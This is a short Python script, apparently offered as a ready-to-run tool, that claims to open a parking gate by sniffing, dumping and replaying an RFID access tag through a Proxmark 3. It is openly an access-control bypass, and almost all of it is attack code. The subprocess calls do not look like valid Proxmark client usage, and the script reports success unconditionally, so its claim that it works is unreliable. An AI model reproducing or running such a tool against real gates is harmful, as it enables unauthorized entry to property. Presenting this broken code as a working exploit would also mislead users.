# -------------------------------------------
# Parking Gate Exploit Using Proxmark 3 (RFID)
# -------------------------------------------
# Functionality:
# - Exploits a parking gate system using Proxmark 3.
# - Captures and clones the RFID tag used by the parking gate system.
# - Replays the cloned RFID tag to gain access.

# Devices being used:
# - Proxmark 3: Captures, clones, and replays RFID signals (13.56 MHz and 125 kHz).
# 
# Example Usage:
# 1. Run the exploit to capture and replay the RFID signal to open the parking gate:
#    python proxmark3_gate.py

import subprocess

def exploit_parking_gate_rfid():
    """
    Exploits a parking gate system by cloning an RFID tag using Proxmark 3.
    """
    print("[+] Attempting RFID exploit on parking gate...")
    subprocess.run(["proxmark3", "hf", "search"])  # Sniff for RFID tag
    subprocess.run(["proxmark3", "hf", "dump"])  # Capture RFID tag data
    subprocess.run(["proxmark3", "hf", "emulate"])  # Replay RFID tag to gain access
    print("[✔] Parking gate unlocked using RFID.")

# Run the exploit
if __name__ == "__main__":
    exploit_parking_gate_rfid()
